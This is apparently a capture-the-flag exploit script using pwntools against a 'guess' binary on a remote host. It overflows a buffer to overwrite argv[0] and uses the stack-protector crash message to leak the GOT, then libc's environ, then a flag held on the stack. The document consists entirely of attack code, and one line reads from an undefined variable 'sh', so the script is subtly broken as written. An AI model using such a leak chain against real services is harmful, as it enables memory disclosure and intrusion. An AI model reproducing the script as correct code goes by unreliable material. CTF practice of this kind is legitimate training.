from pwn import *
context.log_level = 'DEBUG'

p = remote('106.75.90.160', 9999)
elf = ELF('./guess')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

gets_addr = 0x7fffffffe4d0
argv_0_addr = 0x7fffffffe5f8
of_len = argv_0_addr - gets_addr
offset = 0x7ffd12119a88 - 0x7ffd12119920
gets_got_addr = 0x602058

# got ==> libc
p.recvuntil('flag\n')
payload = 'A' * of_len + p64(gets_got_addr)
p.sendline(payload)
p.recvuntil('***: ')
gets_got = u64(sh.recv(6).ljust(8, '\x00'))
print hex(gets_got)
libc_base = gets_got - libc.symbols['gets']
libc.address = libc_base
print hex(libc_base)

# libc ==> environ ==> stack
p.recvuntil('flag\n')
payload = 'A' * of_len + p64(libc.symbols['environ'])
p.sendline(payload)
p.recvuntil('***: ')
stack_addr = u64(p.recv(6).ljust(8, '\x00'))
print hex(stack_addr)

# flag
p.recvuntil('flag\n')
payload = 'B' * of_len + p64(stack_addr - offset)
p.sendline(payload)

p.interactive()
